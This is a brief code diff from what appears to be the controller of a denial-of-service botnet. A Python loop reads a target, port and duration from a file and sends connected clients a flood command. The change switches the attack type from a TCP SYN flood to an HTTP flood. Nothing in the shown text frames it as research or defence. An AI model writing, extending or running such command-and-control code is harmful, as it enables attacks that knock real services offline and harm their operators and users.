@@ -18,7 +18,7 @@ while True:
         target_data = target_file.read().split(" ")
         target_file.close()
         if len(target_data) == 3:
-            send_response(f'SEND TCP-SYN {target_data[0]} {target_data[1]} {target_data[2]}', client)
+            send_response(f'SEND HTTP {target_data[0]} {target_data[1]} {target_data[2]}', client)
         else:
             send_response("NONE", client)
     except Exception as e:
